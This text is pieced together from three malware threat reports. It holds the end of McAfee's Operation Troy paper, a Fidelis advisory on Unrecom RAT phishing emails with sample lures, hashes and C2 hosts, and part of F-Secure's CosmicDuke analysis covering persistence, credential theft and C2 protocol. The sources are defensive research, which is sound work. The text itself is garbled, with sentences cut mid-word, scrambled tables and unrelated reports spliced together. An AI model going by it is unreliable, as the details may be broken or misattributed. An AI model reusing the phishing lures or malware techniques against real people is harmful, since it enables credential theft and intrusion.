 Malware from 2009 Malware from 2010 Malware from 2011 Malware from 2012 Malware from 2013
 Military Attacks Military Attacks Military Attacks Military Attacks Military Attacks

  dkwero38oerA^t@#

 Mail Attack HTTP Troy NSTAR Chang EagleXP Http Dr0pper Tong TDrop
  <caption>Figure 40.Shared encryption password.</caption>
</figure>



</section>

<section>
 <heading>Conclusion</heading>
 McAfee Labs can connect the Dark Seoul and other government attacks to a secret, long-term campaign that reveals the true intention of the Dark Seoul adversaries: attempting to spy on and disrupt South Korea’s military and government activities.The Troy-era malware is based on the same source code used to create these specialized variants and shares many commonalities, such as bs.dll and payload.dll, which are found consistently throughout the families.The attackers have attempted since 2009 to install the capability to destroy their targets using an MBR wiper component, as seen in the Dark Seoul incident.From our analysis we have established that Operation Troy had a focus from the beginning to gather intelligence on South Korean military targets.We have also linked other high-profile public campaigns conducted over the years against South Korea to Operation Troy, suggesting that a single group is responsible.</section>

<noncontent>
 <heading>About the Authors</heading>
 Ryan Sherstobitoff is a threats researcher with McAfee Labs.Formerly, he was Chief Security Strategist at Panda Security,
 where he managed the US strategic response for new and emerging threats.Sherstobitoff is widely recognized as a
 security and cloud computing expert.Itai Liba is a senior security researcher with McAfee Labs.He is a member of the botnet research team.Itai has worked in
 mobile vulnerability research as well as large-scale reverse-engineering projects and display driver development.He has
 more than 10 years of experience in reverse engineering.James Walter is the director of Global Threat Intelligence Operations and manages the McAfee Threat Intelligence Service
 (MTIS) for the Office of the CTO.He focuses on new threats research as well as the cataloging and maintenance of
 vulnerabilities and associated countermeasures.Walter has been with McAfee for more than 14 years and leads a global
 team of threats analysts who create Security Advisories, countermeasure/detector feeds, Global Threat Intelligence apps,
 and more.He is a frequent speaker at industry events and conferences, and cohosts “AudioParasitics—The Official Podcast
 of McAfee Labs.”
</noncontent>

<noncontent>
 <heading>About McAfee Labs</heading>
 McAfee Labs is the global research team of McAfee.http://www.mcafee.com/labs
</noncontent>

<noncontent>
 <heading>About McAfee</heading>
 McAfee, a wholly owned subsidiary of Intel Corporation (NASDAQ: INTC), empowers businesses, the public sector, and
 home users to safely experience the benefits of the Internet.The company delivers proactive and proven security solutions
 and services for systems, networks, and mobile devices around the world.With its visionary Security Connected strategy,
 innovative approach to hardware-enhanced security, and unique global threat intelligence network, McAfee is relentlessly
 focused on keeping its customers safe.http://www.mcafee.com.Other marks and brands may be claimed as the property of others.The product plans, specifications and
888 847 8766 descriptions herein are provided for information only and subject to change without notice, and are provided without warranty of any kind,
www.mcafee.com express or implied.Copyright © 2013 McAfee, Inc.
 60254wp_operation-troy_0713_fnl_ETMG
</noncontent>
</doc>The attack has also been observed
against the financial sector in Saudi Arabia and Russia.1
As Unrecom is a comprehensive multi-platform Java-based remote access tool, currently not detected by
most AntiVirus products, it presents a risk to a large number of potential victims, regardless of operating
system.The following is a screenshot of the Unrecom RAT v.2.0 (Version in Spanish):


<figure></figure>

Over time, various reports in the community have documented the evolution of this tool.This evolution is
to be expected, but its low detection rate, recent use this month through phishing emails campaigns
against multiple sectors in the U.S. and association with past campaigns involving a variety of RATs
captured our attention.The evolution of Unrecom RAT dates from its beginnings as a tool known as
Frutas RAT, subsequently branded as Adwind RAT, and now Unrecom RAT.In 2013, it was reported that Frutas RAT was used in phishing email campaigns against high profile
                                                                                          2
companies in Europe and Asia in sectors such as finance, mining, telecom, and government .<noncontent>Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use.This document
cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval of Fidelis Security
Systems, Inc.While we have done our best to ensure that the material found in this document is accurate, Fidelis Security Systems, Inc. makes no guarantee that
the information contained herein is error free.Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                Rev.It has
some of the following capabilities:
<list>
    -    Collection of System Information (e.g.IP, OS version, memory RAM information, Java version,
         Computer Name, User account compromised, etc.)This document will provide information about the recent phishing campaigns observed with this RAT and
some of the network indicators.</section>
<header>Threat Overview</header>
<section>
The increased threat activity against the U.S. state and local government, technology, advisory services,
and health sectors in the past two weeks is of great concern to us as it is being carried through phishing
emails with what appears to be a tool known as Unrecom RAT.The phishing emails try to trick the users into thinking the emails are legitimate by attaching the RAT with
the some of the following names: Payment Invoice.jar, Payment details.jar,
POR#94586.zip/POR#94586.jar, INV#94586.zip/INV#94586.jar, Invitation.jar, reports-pdf.jar, US$25k.jar,
and DBC_BANK_IMG_23456_156.jar, and lremit_Transfer_Error_Page.jar.</table>



It appears that the latest version of this RAT is 3.2 and is being sold at “unrecom[.]net” for $500
(Enterprise Version) and $200 (Full Version).We find it interesting that on their website, the authors of this software recommend Unrecom RAT buyers
to not scan created servers (malware deployed to Victim systems) at Virustotal nor Metascan.8
Significantly, malware objects seen in previous campaigns like DarkComet and ArcomRAT have also
been observed beaconing to the same CnC servers Unrecom RAT is currently using.DarkComet is
                                                                    6,7
known to be a popular RAT used in threat activity in the Middle East .</section>
<header>Risk Assessment</header>
<section>A remote access tool provides an attacker with full control over the victim system.Once a system has
been compromised, the attacker may install one or more backdoors.These backdoors provide a
persistent foothold, using a separate command and control channel; allowing future access less likely to
be correlated to the original activity.Through its modular plugin framework, this particular tool lets the attacker obtain System Information (e.g.IP, OS version, memory RAM information, Java version, Computer Name, User account compromised,
etc.), Upload & Execute additional malware, Capture Webcam, Remote Desktop, File Manager, Browser
Password Recovery, Capture Microphone, Keylogger, etc.</section>

<header>Indicators and Mitigation Strategies</header>
<section>The following will present detailed information about some of the phishing emails observed and the
attached malware:

<heading>1.Invitation.jar</heading>
<code>
         File Name:          Invitation.jar
         File Size:          43866 bytes
         MD5:                859c4c667dd0f44f80b60242d93c4b0f
         SHA1:               40859bc18ea0ffa9bcf5af699336fbdbfd6be7f1
</code>
    The “Invitation.jar” malware was sent in a phishing email that contained some of the following details:
<table>
                      From                Sarah Alexander <mthomas3@mybluelight[.]com>

                      Subject             Invitation

                      Date                Sun, 4 May 2014 08:44:53 GMT

                      Attachment          Invitation.jar

                      Reply-To            marvinflames@gmail.com

                      X-Originating-Ip     87.117.232[.]203

                      Message body        Hello,

                                          I cordially invite you to our anniversary
                                          It is a celebration of life and love.Just like yesterday, we have grown maturely in our
                                          relationship.We are happy and hope you can join us on our day.Check attachment for Venue, Dress code, Program event
                                          and Date.Thank you all.- Michael Jackson
</table>

    The following is a screenshot of the email:

<figure></figure>


    The “Invitation.jar” malware beaconed to “magnumbiz.no-ip[.Payment details.jar</heading>
<code>
         File Name:         Payment details.jar
         File Size:         43887 bytes
         MD5:               bd0aba05d8263fb1a9a3adcae01fc3b7
         SHA1:              c60551e65cbe54899d1cd1f637b572455dc33b1b
</code>
    The “Payment details.jar” malware was sent in a phishing email that contained some of the following
    details:
<table>
              From                 Arthur Anderson <alexanderharolds@arthurandersen[.]com>

              Subject              Payment details

              Date                 Fri, 16 May 2014 12:27:27 +0000

              Attachment           Payment details.jar

              Reply-To             <alexanderharolds@arthurandersen[.]com>

              Return-Path          alexanderharolds@arthurandersen[.]com

              User-Agent           Internet Messaging Program (IMP) H5 (6.1.4)

              Message body         Attn.Please	
  find	
  attached	
  order	
  details	
  and	
  payment	
  coordinates.kindly	
  	
  
                                   confirm	
  if	
  payment	
  details	
  attached	
  are	
  yours	
  so	
  we	
  can	
  commence	
  payment.Thank	
  you	
  
                                   Alexander	
  Harolds	
</table>


    The following is a screenshot of the email:

<figure></figure>


    The “Payment details.jar” malware beaconed to “morechedder.no-ip[.]org” over port “100”.reports-pdf.jar</heading>
<code>
         File Name:         reports-pdf.jar
         File Size:         44237 bytes
         MD5:               39ad2cab9829ff6a1107b97f1496b499
         SHA1:              1e9ab96ace86a45a33c4ff88a97186efb55e51fb
</code>
    The “reports-pdf.jar” malware was sent in a phishing email that contained some of the following
    details:
<table>
             From                 "Police Department" <cmmds@sbt.co[.]in>

             Subject              Transfer Investigation report

             Date                 Mon, 05 May 2014 07:34:35 -0700

             Attachment           reports-pdf.jar

             Message body         We recieved a report against the attached transaction in your exchange house ,
                                  Kindly report to our nearest station immedietly.A copy has been sent to
                                  cso_[removed_by_analyst].com and investigation@policeheadquater[.]com

                                  Police Investigation Department

                                  --- Disclaimer --- The information in this mail is confidential and is intended
                                  solely for addressee.Access to this mail by anyone else is unauthorised.Copying or further distribution beyond the original recipient may be unlawful.Any opinion expressed in this mail is that of sender and does not necessarily
                                  reflect that of State Bank group.---
</table>

    The following is a screenshot of the email:

<figure></figure>


    The “reports-pdf.jar” malware beaconed to “184.22.201[.US$25k.jar</heading>
<code>
         File Name:          US$25k.jar
         File Size:          43853 bytes
         MD5:                ccfbc03a5beb1adb66f058b1f5a84d98
         SHA1:               cfd0a4d6535f6323e4423bbd07027d294887ea25
</code>
    The “US$25k.jar” malware was sent in a phishing email that contained some of the following details:
<table>
              From                           "Milker Trading Ltd" <rbecerra@pauluhn.com[.]mx>

              Subject                        US$25,000 TT COPY ATTACHED

              Date                           Wed, 14 May 2014 03:28:43 -0500

              Attachment                     US$25k.jar

              X-Get-Message-Sender-Via\      rbecerra@pauluhn.com[.]mx
              authenticated_id
              X-AntiAbuse                    Sender Address Domain - pauluhn.com[.]mx

              User-Agent                     SquirrelMail/1.4.22

              Message body                   Hello,
                                             We have not received any email from you again regarding the
                                             previous
                                             Inquiry.Please see attached the TT Copy of the USD25,000 as
                                             directed by our sales Manager.Kindly check and confirm to me the date of dispatch of our last
                                             order.Regards
                                             Milker Trading Ltd
                                             Auggenthal 1
                                             94140 Ering
                                             Mexico.</table>


    The “US$25k.jar” malware beaconed to “toba.no-ip[.Payment Invoice.jar</header>
<code>
         File Name:          Payment Invoice.jar
         File Size:          44237 bytes
         MD5:                44f011702ff80b337124d4879607f6b1
         SHA1:               b2474bffcbeaabdd111f3909075fc7f556901c62
</code>
    The “Payment Invoice.jar” malware was sent in a phishing email that contained some of the following
    details:
<table>
                             From               Johnson Kelly <johnsonkelly52@live[.]com>

                                                Thank you
                             Subject
                                                Sat, 10 May 2014 10:45:55 -0700
                             Date
                                                Payment Invoice.jar
                             Attachment
                                                johnsonkelly52@live[.]com
                             Return-Path
                                                Here is the invoice
                             Message
</table>

    The “Payment Invoice.jar” malware beaconed to “greengreen1.no-ip[.]biz” over port “100”.</section>
<section>
<heading>6.INV#94586.jar</heading>
<code>
         File Name:          INV#94586.jar
         File Size:          43885 bytes
         MD5:                06c2760060d41533b36572ae3c1ba2df
         SHA1:               0350f53a821933e05bf82508b1e458c83d37b7c8
</code>
    The “INV#94586.jar” malware was sent in a phishing email that contained some of the following
    details:
<table>
                   From                        Diosdado <kdiosdado@lilbello[.]com>

                                               FW: URGENT CONFIRMATION P/I #94578
                   Subject
                                               11 May 2014 19:10:47 -0700
                   Date
                                               INV#94586.zip
                   Attachment
                                               sales@ttc-qroup[.]com
                   Disposition-Notification-
                   To

                   Message body                Good Day,

                                               Please find the attached document.Regards,

                                               Diosdado
                                               Procurement Officer
                                               Mobile: +966 54 073 5573
                                               Tel.: +966 13 341 9915, Ext.283
                                               Fax: +966 13 340 4869
                                               Email: diosdado@lilbello[.]com
                                               P.O Box 11976, Jubail - 31961.]44” over port “1511”.]com"
                                                <remittance_dbcbank1@aol[.]85

                Message body
                                                kindly	
  find	
  attached	
  our	
  bank	
  online	
  java	
  documents	
  for	
  your	
  
                                                reference,corr=ct	
  details	
  on	
  the	
  marked	
  boxes	
  and	
  email	
  back	
  to	
  me.do	
  not	
  hesitate	
  to	
  contact	
  me	
  if	
  need	
  be.regards	
  
                                                	
  
                                                Mary	
  Alidu	
  
                                                Swift	
  Admin,	
  
                                                Kurdsitan	
  Int'l	
  Bank	
  For	
  Inv	
  And	
  Dev	
  
                                                KIB.If	
  you	
  have	
  received	
  it	
  in	
  
                                                error,<=r>	
  please	
  contact	
  us	
  immediately	
  by	
  return	
  e-­‐mail	
  and	
  
                                                delete	
  it	
  from	
  your	
  
                                                system.Please	
  note	
  that	
  the	
  sender	
  shall	
  not	
  be	
  liable	
  for	
  the	
  
                                                improper<BR=	
  this	
  
                                                communication	
  ,	
  nor	
  for	
  any	
  delay	
  in	
  its	
  receipt	
  or	
  damage	
  to	
  your	
  
                                                system.lremit_Transfer_Error_Page.jar</heading>
<code>
         File Name:           lremit_Transfer_Error_Page.jar
         File Size:           43861 bytes
         MD5:                 8811a91e0ef5b181b1f0433d913faaaf
         SHA1:                ca771a56a8e63565b0638e84bac0db0e6c0fadf8
</code>
    The “lremit_Transfer_Error_Page.jar” malware was sent in a phishing email that contained some of
    the following details:
<table>
                From                            "Мишин О.Н."[O.N.Mishin@chelindbank[.]ru]

                Subject                         Transfer error, kindly reverse to us.Date                            Mon, 5 May 2014 09:47:22 +0600

                Attachment                      lremit_Transfer_Error_Page.jar

                Return-Path                     <O.N.Mishin@chelindbank[.]ru>

                Message body
                                                -------- Original Message --------
                                                Subject: Transfer error, kindly reverse to us.Date: Sun, 4 May 2014 00:42:37 -0400 (EDT)
                                                From: swift@ificbankbd.com <herat.telex@aol.com>
                                                To: [removed_by_analyst]
                                                Greetings,
                                                Please kindly refund the attached payment sent to your bank, it
                                                was an application error from our bank.Your sincere cooperation will be appreciated.If you are not
                                                the intended recipient, you are hereby notified that any use of
                                                the information contained in or transmitted with the
                                                communication or dissemination, distribution, or copying of this
                                                communication is strictly prohibited.]by/images/sola/httpsiremit.com.aui-remit-to-the-philippines-cheapest-remittance-
    service-for-pinoy-in-australi.zip”

    The “lremit_Transfer_Error_Page.jar” malware beaconed to “resultpage92.no-ip[.]biz	
  


Payment	
  details	
                                Payment	
  details.jar	
            bd0aba05d8263fb1a9a3adcae01fc3b7	
      morechedder.no-­‐        100	
  
                                                                                                                                ip[.]org	
  


Transfer	
  Investigation	
  report	
               reports-­‐pdf.jar	
                 39ad2cab9829ff6a1107b97f1496b499	
      184.22.201[.]27	
        3030	
  


US$25,000	
  TT	
  COPY	
  ATTACHED	
               US$25k.jar	
                        ccfbc03a5beb1adb66f058b1f5a84d98	
      toba.no-­‐ip[.]biz	
     1505	
  


Thank	
  you	
                                      Payment	
  Invoice.jar	
            44f011702ff80b337124d4879607f6b1	
      greengreen1.no-­‐        100	
  
                                                                                                                                ip[.]biz	
  


INV#94586.jar	
                                     FW:	
  URGENT	
                     06c2760060d41533b36572ae3c1ba2df	
      192.95.21[.]44	
         1511	
  
                                                    CONFIRMATION	
  P/I	
  #94578	
  


ComFirm	
  transactions	
  before	
                 Hold-­‐transactions-­‐pdf.jar	
     bc84b115d98988c5489d6acf96046b78	
      184.22.201[..jar	
                                                                      ip[.]biz	
  


Remittance	
  Error	
  2089/234-­‐	
                DBC_BANK_IMG_23456_15               8842ce373c910c012a0aa58e37b3d080	
      magawalton.no-­‐         1505	
  
Reported	
  lost	
  of	
  data	
                    6.jar	
                                                                     ip[.]27) that the malware communicates with is shared by two separate phishing
emails in this campaign, as shown in the diagram below.Beginning at the top of the diagram and working down, on the left side of the diagram are two phishing
emails, the details of which are referenced in the pages above as item numbers 2 & 3.Of note, these
phishing emails were sent to users at two separate and unrelated organizations.As you can see, when
compared to each other, these messages appear completely unrelated, other than the fact they both
contain jar files that are sophomorically “obfuscated” as pdf.jar files.Note that both the subjects, “Transfer investigation report” and “Confirm transactions before release” are
comparatively unique as are the senders , "Police Department" cmmds@sbt.co[.]in and Arthur Anderson
alexanderharolds@arthurandersen[.]com.In addition to the fact that the emails share no attributes, the
malicious attachments are also unrelated.Finally, and of most interest in this diagram, the central node at the bottom of the diagram, represents the
Command and Control node (184.22.201[.]27) used by these two examples.While this shared resource
is noteworthy, of particular interest is that it has also been used in other campaigns.We are publishing these
indicators so that others in the security research community can monitor for this activity and potentially
correlate against other campaigns and tools that are being investigated.Fidelis XPS™, the Advanced Threat Defense solution from General Dynamics Fidelis Cybersecurity
Solutions detects all of the activity documented in this paper.The Fidelis Threat Research Team will
continue to follow this specific activity and actively monitor the ever-evolving threat landscape for the
latest threats to our customers’ security.</section>
<header>References</header>
<section>
1.Adwind RAT Rebranding, Nov 2013: http://www.crowdstrike.com/blog/adwind-rat-
   rebranding/index.html
2.Targeted Attacks Delivering Fruit, Aug 2013: http://www.symantec.com/connect/blogs/targeted-
   attacks-delivering-fruit
3.Remote Access Tool Takes Aim with Android APK Binder, Jul 2013:
   http://www.symantec.com/connect/blogs/remote-access-tool-takes-aim-android-apk-binder
4.Old Java RAT Updates, Includes Litecoin Plugin, Apr 2014: http://blog.trendmicro.com/trendlabs-
   security-intelligence/old-java-rat-updates-includes-litecoin-plugin/
5.Cross-Platform Frutas RAT Builder and Back Door, Feb 2013:
   http://www.symantec.com/connect/blogs/cross-platform-frutas-rat-builder-and-back-door
6.DarkComet Analysis – Understanding the Trojan used in Syrian Uprising, Mar 2012:
   http://resources.infosecinstitute.com/darkcomet-analysis-syria/
7.DarkComet RAT - It is the END!, Jul 2012:
   http://www.symantec.com/connect/blogs/darkcomet-rat-it-end
8.Tsunami Warning Leads to Arcom RAT, Nov 2012
   http://blog.trendmicro.com/trendlabs-security-intelligence/tsunami-warning-leads-to-arcom-rat/
</section>



<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                               Rev1.1 2014-05-21
Threat Advisory #1013                            Page 16 of 16      RAT in a jar: a phishing campaign using Unrecom
</noncontent>
</doc>When active on an infected
machine, CosmicDuke will search for and harvest
login details from a range of programs and forward
the data to remote servers, some of which were
active at the time of writing.While investigating MiniDuke              
loaders in April 2014, we were surprised to notice that the
malicious executable being decompressed and loaded             
into memory was very similar to the Cosmu family of            
information-stealers, which we saw as long ago as 2001.Cosmu is the first malware family we have seen to share        
code with MiniDuke.This analysis is focused on those Cosmu samples that           
share code with MiniDuke.Some of these are older than         
the oldest publicly documented MiniDuke samples,
implying that the shared code might have been originally
used by Cosmu, not MiniDuke.For convenience, we               
decided to name the samples showing this amalgamation          
of MiniDuke-derived loader and Cosmu-derived payload           
CosmicDuke.The filenames and content used in CosmicDuke’s                 
attack files to lure victims into opening them contain         
references to the countries of Ukraine, Poland, Turkey         
and Russia,either generally in use of language or included     
detail, or in allusions to events or institutions.The         
filenames and content chosen seem to be tailored to their
target’s interests, though at the time of writing, we have
no further information on the identity or location of these
victims.CosmicDuke infections start by tricking victims into           
opening either a PDF file that contains an exploit or a        
Windows executable whose filename is manipulated to            
make it look like a document or image file.Once the victim opens the file, the malware gains              
persistence on the system and starts collecting                
information.The data collection components include a          
keylogger, clipboard stealer, screenshotter, and password
stealers for a variety of popular chat, email and web
browsing programs.It also collects information about
the files on the system, and has the capability to export
cryptographic certificates and the associated private keys.Once the information has been collected, it is sent out to
remote servers via FTP.In addition to stealing information
from the system, Cosmu allows the attacker to download
and execute other malware on the system.F-Secure has detections for all the different malicious
components used by the Cosmu variants described in this
report.</section>

<section>
<heading>SCOPE</heading>
We have seen dozens of Cosmu samples that share code
with MiniDuke.Rather than cover the entire spectrum
of samples, the scope of this analysis was intentionally
limited to highlighting the most interesting of the
recent samples.This includes examining the attack files
used to infect targets, the remote servers storing data
collected from the victims and the differences between
the MiniDuke loaders and Cosmu info-stealers used in the
samples.</section>

<section>
<heading>TARGET</heading>
This analysis is based on examination of files we gathered
through our sample collection systems.Based on the
nature of the filenames and decoy documents used, and
the fact that the MiniDuke loader is known to be used as a
part of targeted attacks, we suspect that CosmicDuke may
also be used in such operations.At the time of writing,
we have not identified any victims ourselves, nor are we
aware of any public reports confirming this scenario.It is possible that the PDF documents containing exploits
were emailed to the targeted users as file attachments.Assuming that the email gateway used by the victims does        
not include an antivirus solution capable of identifying the
exploit, such files would have little impediment to being       
spread by email.It is however unlikely that the samples which camouflaged       
the executable files as image or document files would           
be distributed in the same way.Regardless of any tricks
played with the filenames, the files themselves are             
Windows executables, and many email solutions today             
prevent users from opening attached executable files.</section>

<section>
<heading>INFECTION</heading>                                                       
The attackers are using at least two different methods for      
infecting the systems: exploits and social engineering.<heading>DOCUMENT-BASED EXPLOIT</heading>                                          
CosmicDuke malware samples that use exploits to gain            
entry onto a target system (referred to as exploit files        
in the rest of this document) start with a malicious            
Flash object embedded into a PDF file.When the file is
launched, the object exploits the known CVE-2011-0611
vulnerability in specific versions of Adobe Flash, Reader
and Acrobat products.Unlike the CosmicDuke files geared towards social
engineering, the exploit files do not actually display
any documents to the user as a form of distraction; the
malware simply straightaway exploits the vulnerability.</section>

<section>
<heading>SOCIAL ENGINEERING</heading>
Less technically challenging CosmicDuke samples use
simple social engineering to trick the user into willingly
launching the attack file.Once launched, the file drops
the malware onto the system (such files are therefore
referred to as droppers in the rest of this documents).To do so, the malware’s executable file is first disguised as
an image or document to make it seem innocuous.When
launched, a document or image is displayed in order to
draw the user’s attention away from any background
activity.In the meantime, the malware’s malicious files are
silently installed and executed on the system.</section>

<section>
<heading>DATA THEFT</heading>
CosmicDuke’s primary purpose is to steal information.Our analysis also
reveals various details of the remote sites contacted by
CosmicDuke, including the login credentials used and the
FTP folder structure.At the time of writing, most of these remote sites are live.A list of the servers CosmicDuke malware connects to is
on page 15.</section>
     
<header>
COSMICDUKE COSMU WITH A TWIST OF MINIDUKE
4
</header>

<section>
<heading>TECHNICAL DETAILS</heading>                                                      
CosmicDuke samples can be divided into 3 distinct groups               
based on similarities between the C&C servers they
contact, file characteristics and decoy document used.The full details of how the samples were grouped is listed
on page 11; Figure 2 at left provides a quick summary of the           
grouping as they relate to how CosmicDuke is delivered,                
and the decoy documents shown.The first group of samples (Group #1) is spread using 3
dropper files that display specific decoy documents.The
second sample group (Group #2) uses both exploit-loaded
files and dropper files.The third group (Group #3) is rather                                               
an exception, as it does not use the droppers or exploits              
listed here; for the sake of simplicity, we will exclude               
considering Group #3’s delivery method.<caption>FIGURE 2: COSMICDUKE SAMPLES
       GROUPED BY INFECTION VECTOR</caption>
<figure>       
                     GROUP #1
                     DROPPERS:
                    rcs.Заказ.doc
                       rcs.18.jpg
               rcs.DSC_1365527283.jpg
 GROUP #2                        GROUP #3
  EXPLOITS &                        ?Image 1 is a screenshot of how the filenames look like in
Windows 7.The real file extension for the top four files is      
.scr, while the real extension for the bottom one is .exe.Note that the attacker has also carefully changed the icon        
of the executable to reflect the fake filetype for the first      
four.The bottom file is a curious exception, as it does not use a
PDF icon as would be expected with a .pdf file extension;
instead, it uses an NVIDIA icon, most likely to reflect the
fact that the product name of the executable is listed
as “NVIDIA Update Components” in the file’s version
information.This seems to be a common fake product
name used in the latest Cosmu samples.Meanwhile, the
filename readily visible to the users is translated from
Turkish as “civilian crisis center status report”.The use of RLO is a smart move from the attackers.Why
go through the trouble of exploiting anything if you can
simply trick the user into double-clicking an executable
that looks a lot like a document file?As the screenshot demonstrates, unchecking “Hide
extensions for known filetypes” does not help.The three-
letter file extensions seen at the end of the filename is not
the real file extension.Even though the information in the
Type column is correct, most of the users probably do not
even check it.</section>
                                                                 
<header>
COSMICDUKE COSMU WITH A TWIST OF MINIDUKE
                                                                                                             5
</header>

<section>
DROPPER: DECOYS
                                                              
CosmicDuke dropper files all display some kind of a decoy     
document or image to distract the user when the attack
file is launched.The following are the droppers used by Group #1.Here are
the filenames of the decoys, as displayed in Windows, and
the decoy images or files they show when launched:
yy rcs.Заказ.doc			                - Image 2
yy rcs.18.jpg 			                  - Image 3
yy rcs.DSC_1365527283.jpg	         - Image 4

The decoys are interesting.Заказ means “order” in
Russian.Based on the characters СЖС-1295 and ГХРП
found in the decoy, the document looks like an order for
growth hormones.The document contains full delivery
address, including the name of the person placing the
                                                              
order.An interesting detail about the image file of a receipt       
(Image 3) shown by rcs.18.jpg is that it contains EXIF
metadata, including the date when the photo was taken
and the model of the mobile phone that was used to take
the photo.Part of this EXIF metadata is shown in Image 3a.The third dropper file we’ve seen uses the filename ‘rcs.Ukraine-Gas-Pipelines-Security-Report-March-2014.pdf’,
and displays the decoy document shown in Image 6.This
particular dropper file is notable in that its info-stealer
(SHA1:f513b21738ae3083d79e4fa1039889e1c3efff58) is the
same one used by the exploit file named “Bulletin-PISM-
No-31-(625)-March-10-2014.pdf”.Some of these exploit files have interesting filenames,                                                              
such as “dip.mail march.pdf” and “Bulletin-PISM-No-                            
31-(625)-March-10-2014.pdf”.The PISM mentioned in
the latter presumably refers to the Polish Institute of                        
International Affairs <fn>[1]</fn>.The parallel usage of the loader in the CosmicDuke and                
MiniDuke families is interesting.The oldest samples we
have of this loader that loads Cosmu malware show the                 
compilation date of the loader as March 24 2011, which                
predates the oldest publicly documented MiniDuke
sample (with a recorded loader compilation date of                    
June 18 2012).The earlier use of the loader with a Cosmu
payload leads us to suspect the existence of a link
between the author(s) of Cosmu and MiniDuke.The most common compilation date seen for the loaders
that load the Cosmu malware is November 13 2012.Perhaps coincidentally, we found one MiniDuke sample
(originally reported by CrySys <fn>[3]</fn>) that also shows the same          
compilation date.In this case however, the MiniDuke
component is actually a downloader; it connects to an
IP address in Turkey, and when it receives a response,                                                           
decrypts and executes it.Also of interest is that once the MiniDuke loader was                 
updated, we saw CosmicDuke samples take the updated
loader into use in mid-April 1 2014, a few months after
MiniDuke started using the latest loader in mid-December
2013.It seems possible that the actors behind the two
malware families share code and/or tools.Polish Institute of International Affairs; http://www.pism.pl/en
2.CIRCL - Computer Incident Response Center Luxembourg; Analysis of a stage 3 Miniduke sample; published 30 May 2013;
   http://www.circl.lu/assets/files/tr-14/circl-analysisreport-miniduke-stage3-public.pdf
3.The technical description of the
info-stealer is based on analysis of the following sample:

SHA1: b072577447cdf3936d95e612057e510dd3435963.</section>                                                              
          
<section>                                                                        
<heading>PERSISTENCE</heading>                                                             
                                                                        
Cosmu has a couple of different mechanisms for achieving                
persistence on the system.It creates a scheduled task and
installs a Windows service.The scheduled task is typically named “Watchmon                         
Service”.It executes the malware at system startup.The service typically has name javamtsup, and the display               
name is ”Java(TM) Virtual Machine Support Service”.The                 
size of the service binary on disk varies, but typically the            
real size is 5120 bytes (based on PE headers) and the SHA1
value is 7803f160af428bcfb4b9ea2aba07886f232cde4e.The service itself is very straightforward: it opens a handle           
to explorer.exe process, duplicates its process token,
reads the path of the actual malware binary from registry               
(key HKLM\Software\JavaSoft, value Supplement) and                      
starts the malware using the duplicated process token.Cosmu copies itself with a couple of different filenames                
to %WINDIR%\system32.The binaries on the disk have a                   
variable length of zero-padding but they are all essentially            
copies of the original malware binary.The attacker
        can obtain victim’s Skype username and password
        by using a bruteforce or dictionary attack to crack
        the MD5.The attack was publicly documented in
        2006 <fn>[4]</fn>. Google Talk
        Cosmu decrypts and steals saved credentials from
        Google Talk. MSN Messenger
        Cosmu decrypts and steals saved credentials from
        MSN Messenger.yy Browsers
      Google Chrome
        Cosmu steals saved credentials from Google
        Chrome. Internet Explorer
        Cosmu steals autocomplete passwords from IE.It
        also collects information about visited websites,
        i.e., browsing history. Firefox
        Cosmu steals saved credentials and the associated
        URLs from Firefox.The malware does not decrypt
        the credentials.yy Email clients
      Thunderbird
        Cosmu steals saved credentials and the associated
        mail server hostnames from Thunderbird.The
        malware does not decrypt the credentials. Bat email client
        Cosmu steals credentials from Bat email client
        by parsing account.cfn and decrypting the
        credentials. Outlook Express
        Cosmu steals saved credentials and information
        about the associated mail server from Outlook
        Express. Outlook
        Cosmu steals saved credentials and information
        about the associated mail server from Outlook. Google Desktop
        Cosmu decrypts and steals saved credentials from
        Google Desktop.<footnote>
4.Fabrice Desclaux & Kostya Kortchinsky; Vanilla Skype part 2; published June 17th 2006;
   http://www.recon.cx/en/f/vskype-part2.pdf
</footnote>   
      
<header>
COSMICDUKE COSMU WITH A TWIST OF MINIDUKE
8
</header>

yy Others                                                      
       Windows credentials                                     
         LM and NT hashes, cached domain passwords, LSA        
         secrets. WLAN                                                    
         Cosmu uses WlanGetProfile to retrieve plain text      
         keys for WLANs.</section>                                                               
          
<section>                                                               
<heading>CERTIFICATE STEALING</heading>                                           
                                                               
Cosmu exports certificates and, if available, the              
associated private keys from system store by calling           
PFXExportCertStoreEx.The malware uses the password            
“saribas” to encrypt the exported data.</section>

<section>                                                               
  <heading>KEY LOGGER</heading>
The keylogger is implemented using the
GetKeyboardState API.</section>

  <section>
  <heading>CLIPBOARD STEALER</heading>
  Cosmu copies the content of the clipboard every 30
  seconds and sends those to the attacker together with
  other stolen data.</section>

  <section>
  <heading>CONFIGURATION</heading>
  The configuration can contain the following information:

  yy   HTTP server IPs and URL paths
  yy   FTP server IPs, usernames and passwords
  yy   WebDav IPs, usernames and passwords
  yy   Filename prefix and file extension for downloaded files
  yy   Filename prefix and file extension for exfiltrated data

  In all the configurations we have seen, the servers are
  specified using IP addresses, not domain names.The configuration is embedded into the info-stealer.It is
  compressed using an algorithm similar to but simpler than
  LZNT-1 <fn>[5]</fn>.</section>                                                       

<footnote>
5.The GET request contains
the following fields in this order:
<list>
yy   m or mgn
yy   Auth
yy   Session
yy   DataID
yy   FamilyID
yy   BranchID
yy   VolumeID
yy   User
yy   Query.</list>
The first field, m or mgn, does not have any value.The value of Auth is the ID of the sample.It is the same
8-character hex digit that can be found in the PDB path,
among other places.The value of Query depends on the request.It is either
encoded using URL safe base64, or then the value is
a 1792-character string.That string is composed of a
256-character string that is repeated seven times.The 256-character string is generated by selecting              
characters randomly from the following 32-character             
alphabet:
                                                                
abcdefghijklmnopqrstuvwxyz012345                                
                                                                
The malware uses the FTP servers and WebDav servers
both for exfiltrating the collected data and for updating
the malware.All servers used by the info-stealers listed in “Appendix A |   
Samples” are listed in “Appendix B | Servers”.</section>                                                                
          
<section>                                                                
<heading>RC4 ENCRYPTION</heading>
Cosmu uses RC4 to decrypt incoming data and encrypt
outgoing data.The RC4 routine is not standard RC4, but         
instead of an intentional customization it seems that the       
implementation is simply buggy.The mistake is illustrated      
in Figure 5 that shows a Python re-implementation of the        
buggy RC4.All RC4 keys are 32 bytes.<caption>FIGURE 5: PYTHON IMPLEMENTATION OF THE
